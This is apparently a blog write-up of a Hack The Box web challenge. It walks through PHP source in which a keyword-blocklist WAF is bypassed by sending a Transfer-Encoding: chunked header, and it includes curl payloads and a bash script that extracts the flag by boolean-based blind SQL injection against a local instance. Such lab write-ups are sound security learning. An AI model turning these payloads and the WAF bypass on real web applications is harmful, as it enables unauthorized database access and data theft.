---
layout: post
title: 0xBOverchunked
date: 2024-03-01 18:27 -0500
img_path: /assets/img/0xBOcerchunked/
published: true
tags: ["Hack The Box"]
categories: ["sqli","CTF","Web Challenge"]
toc: true
---
# 0xB0verchunked
The webpage features a basic search functionality, which suggests the possibility of an SQL injection. This suspicion deepens when a straightforward payload, such as ```1'```, is attempted
![Waf?](image.png)
lets take that string as the starting point on our source code review

## Source code Review

That string leads  us to the SearchHandler.php file. we observe that the function **waf_sql_injection** processes our input. Depending on the output, it will either execute the query using **safequery**, or displays the message "SQL Injection attemp..."

```php
<?php
function waf_sql_injection($input)
{
    $sql_keywords = array(
        'SELECT',
        'INSERT',
        'UPDATE',
        'DELETE',
        'UNION',
        'DROP',
        'TRUNCATE',
        'ALTER',
        'CREATE',
        'FROM',
        'WHERE',
        'GROUP BY',
        'HAVING',
        'ORDER BY',
        'LIMIT',
        'OFFSET',
        'JOIN',
        'ON',
        'SET',
        'VALUES',
        'INDEX',
        'KEY',
        'PRIMARY',
        'FOREIGN',
        'REFERENCES',
        'TABLE',
        'VIEW',
        'AND',
        'OR',
        "'",
        '"',
        "')",
        '-- -',
        '#',
        '--',
        '-'
    );

    foreach ($sql_keywords as $keyword)
    {
        if (stripos($input, $keyword) !== false)
        {
            return false;
        }
    }
    return true;
}

?>
```
Take and array of keywords and check if the input string contains any of them, *strpost()* function works: 'Find the position of the first occurrence of a case-insensitive substring in a string'. 
So we need to find a way inject without using any keywords on the array , first on my mind is how to escape the single quote without using single quote. 
Now check the other function **safequery** 
```php
function safequery($pdo, $id)
{
    if ($id == 6)
    {
        die("You are not allowed to view this post!");
    }

    $stmt = $pdo->prepare("SELECT id, gamename, gamedesc, image FROM posts  WHERE id = ?");
    $stmt->execute([$id]);

    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    return $result;
}
```
Interesting that thing on post 6, but we can observe, they use prepared statement to execute queries, so even if we bypass the 'WAF' we can't inject sql queries. 

That thing of ```$id == 6 ``` wake up my curiosity and i decide to review db folder, because inspecting on the **Dockerfile**, I notice on line 17 
```RUN sqlite3 /opt/app/db/chunked.db < /opt/app/db/init.sql```
This command for initializing the SQLite database within the Docker container caught my attention. It hinted at the database structure and potential entry points for investigation.
```sql
INSERT INTO posts (gamename, gamedesc, image)
VALUES
  ('Pikachu', 'A small, yellow, mouse-like creature with a lightning bolt-shaped tail. Pikachu is one of the most popular and recognizable characters from the Pokemon franchise.', '1.png'),
  ('Pac-Man', 'Pac-Man is a classic arcade game where you control a yellow character and navigate through a maze, eating dots and avoiding ghosts.', '2.png'),
  ('Sonic', 'He is a blue anthropomorphic hedgehog who is known for his incredible speed and his ability to run faster than the speed of sound.', '3.png'),
  ('Super Mario', 'Its me, Mario, an Italian plumber who must save Princess Toadstool from the evil Bowser.', '4.png'),
  ('Donkey Kong', 'Donkey Kong is known for his incredible strength, agility, and his ability to swing from vines and barrels.', '5.png'),
  ('Flag', 'HTB{f4k3_fl4_f0r_t35t1ng}', '6.png');
```
Now we know what our goal is. 
Going back to the **SearchHandler.php** we can see the at the beginning, before entering the **waf_sql_injection** function an If statement 
```php
if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
{
    $search = $_POST['search'];

    $result = unsafequery($pdo, $search);

    if ($result)
    {
        echo "<div class='results'>No post id found.</div>";
    }
    else
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }

}
```
If we send a request with ```Transfer-encoding: chunked``` header besides the Content-length header, we will pass to the **unsafequery** function
```php
function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }
}
```
This function as his name suggest its unsafe because pass the ```$id``` variable whitout sanitization.


## Local Testing

We can make the request with the header required using Burp Suite.
![alt text](image-1.png)
The bad thing its that we need to update the size of the chunk manual, and that is horrible. 
So we can use curl command 
```bash
curl  -s -k -X 'POST'  -H 'Host: 127.0.0.1:1337' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Transfer-Encoding: chunked' -d "search=1'and 1=2-- -" 'http://127.0.0.1:1337/Controllers/Handlers/SearchHandler.php'

Internal Server Error
```
and 
```bash
curl  -s -k -X 'POST'  -H 'Host: 127.0.0.1:1337' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Transfer-Encoding: chunked' -d "search=1'and 1=1-- -" 'http://127.0.0.1:1337/Controllers/Handlers/SearchHandler.php'

<div class='results'>No post id found.</div>
```
Whith this we confirm a boolean-base sql injection. 

## Proof of Concept

Lets make a bash script to exploit this.
```bash
#!/bin/bash

url="http://127.0.0.1:1337/Controllers/Handlers/SearchHandler.php"

function oracle()
{
    local q="$1"
    request=$(curl  -s -k -X 'POST' -H 'User-Agent: Mozilla/5.0' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Transfer-Encoding: chunked' -d "search=1'AND (${q})--" ${url} | html2text)
#    echo ${request}
    if [[ "${request}" =~ "No post id found." ]]; then
        return 1
    else
        return 0   
    fi
}
finalValue=""
for i in $(seq 1 36); do
    low=32
    high=127
    while [[ "$low" -le "$high" ]]; do
       mid=$(((low + high) / 2))
       q="SELECT UNICODE(SUBSTR(gamedesc,${i},1)) FROM posts WHERE gamename='Flag' AND UNICODE(SUBSTR(gamedesc, ${i}, 1)) BETWEEN ${mid} AND ${high}"
        if oracle "$q"; then
            high=$((mid - 1))
        else
            low=$((mid + 1))
        fi     
    done
    finalValue=$((low - 1)) # Don't know why , - 1?
    printf "\x$(printf %x "${finalValue}")"
done
```

![pwned](image-2.png)